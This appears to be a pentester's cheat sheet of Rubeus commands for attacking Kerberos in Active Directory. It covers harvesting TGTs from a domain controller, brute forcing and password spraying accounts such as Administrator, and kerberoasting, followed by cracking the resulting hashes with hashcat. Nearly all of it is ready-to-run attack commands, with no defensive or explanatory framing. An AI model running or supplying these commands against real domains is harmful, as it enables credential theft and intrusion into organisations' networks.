### harvest
- Gathers TGT flowing from a KDC every x interval.
```powershell
.\Rubeus.exe harvest /interval:30
```
### brute
- Used to bruteforce or password spray kerberos credentials.
```powershell
# password spray
.\Rubeus.exe brute [OPTIONS] /noticket
# [OPTIONS]
/password:Passw0rd!
/passwords:password.txt
/username:Administrator
/usernames:username.txt
```
### kerberoast
- Perform kerberoasting attack
```powershell
.\Rubeus.exe kerberoast /nowrap

# Hash can be cracked with
hashcat -m 13100 hash.txt pass.txt
```